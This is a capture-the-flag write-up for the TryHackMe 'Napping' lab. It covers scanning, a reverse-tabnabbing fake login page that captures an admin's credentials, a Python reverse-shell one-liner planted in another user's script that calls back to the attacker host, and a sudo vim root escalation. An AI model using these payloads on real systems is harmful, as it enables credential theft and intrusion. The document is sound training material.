# Napping

**Room Link:** [https://tryhackme.com/r/room/nappingis1337](https://tryhackme.com/r/room/nappingis1337)

### **Scans** <a href="#scans" id="scans"></a>

Initial scan

**Kali**

```
nmap -A $VICTIM
```

<figure><img src="../../.gitbook/assets/image (1028).png" alt=""><figcaption></figcaption></figure>

Longer scan

**Kali**

```
nmap -sV -sT -O -p 1-65535 $VICTIM
```

<figure><img src="../../.gitbook/assets/image (1029).png" alt=""><figcaption></figcaption></figure>

## **TCP/80 - HTTP**

#### Find Pages <a href="#find-pages" id="find-pages"></a>

**Kali**

```
gobuster dir -u http://$VICTIM -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,txt
```

<figure><img src="../../.gitbook/assets/image (1032).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
echo "hi" > test.html
python2 -m SimpleHTTPServer 82
```

<figure><img src="../../.gitbook/assets/image (1030).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/image (1031).png" alt=""><figcaption></figcaption></figure>

**red.htm**

```
<!DOCTYPE html>
<html>
 <body>
  <script>
  window.opener.location = "http://$KALI:8000/redir.html";
  </script>
 </body>
</html>
```

**redir.html**

```
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Login</title>
    <link rel="stylesheet" href="<https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css>">
    <style>
        body{ font: 14px sans-serif; }
        .wrapper{ width: 360px; padding: 20px; }
    </style>
</head>
<body>
    <div class="wrapper">
        <h2>Admin Login</h2>
        <p>Please fill in your credentials to login.</p>
<form action="/admin/login.php" method="post">
            <div class="form-group">
                <label>Username</label>
                <input type="text" name="username" class="form-control " value="">
                <span class="invalid-feedback"></span>
            </div>    
            <div class="form-group">
                <label>Password</label>
                <input type="password" name="password" class="form-control ">
                <span class="invalid-feedback"></span>
            </div>
            <div class="form-group">
                <input type="submit" class="btn btn-primary" value="Login">
            </div>
            <br>
        </form>
    </div>
</body>
</html>
```



**Kali**

```
wireshark
```

For victim to download our red.html file

**Kali**

```
python2 -m SimpleHTTPServer 82
```

To host our fake login page

**Kali**

```
python2 -m SimpleHTTPServer 8000
```



<figure><img src="../../.gitbook/assets/image (1033).png" alt=""><figcaption></figcaption></figure>



**Wireshark filter**

```
tcp.port==8000 && ip.dst == $VICTIM
```

<figure><img src="../../.gitbook/assets/image (1035).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1034).png" alt=""><figcaption></figcaption></figure>

## **TCP/22 - SSH**

**Kali**

```
ssh daniel@$VICTIM
Password: C@ughtm3napping123
```

## Lateral Movement

there is another user on this box. In their home directory they have a python script that looks like it checks the website. I added the following to the code to get a reverse shell.

<figure><img src="../../.gitbook/assets/image (1036).png" alt=""><figcaption></figcaption></figure>

**query.py**

```
import os,pty,socket;s=socket.socket();s.connect(("$KALI",1337));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")
```

<figure><img src="../../.gitbook/assets/image (1037).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
nc -lvnp 1338
```

<figure><img src="../../.gitbook/assets/image (1038).png" alt=""><figcaption></figcaption></figure>

**Full TTY**

```
script -qc /bin/bash /dev/null
ctrl + Z
stty raw -echo;fg
```

## **Privilege Escalation**

**Exploit:** [https://gtfobins.github.io/gtfobins/vim/](https://gtfobins.github.io/gtfobins/vim/)

**Victim(adrian)**

```
sudo -l
```

<figure><img src="../../.gitbook/assets/image (1040).png" alt=""><figcaption></figcaption></figure>

**Victim(adrian)**

```
sudo vim -c ':!/bin/sh'
id
```

<figure><img src="../../.gitbook/assets/image (1041).png" alt=""><figcaption></figcaption></figure>



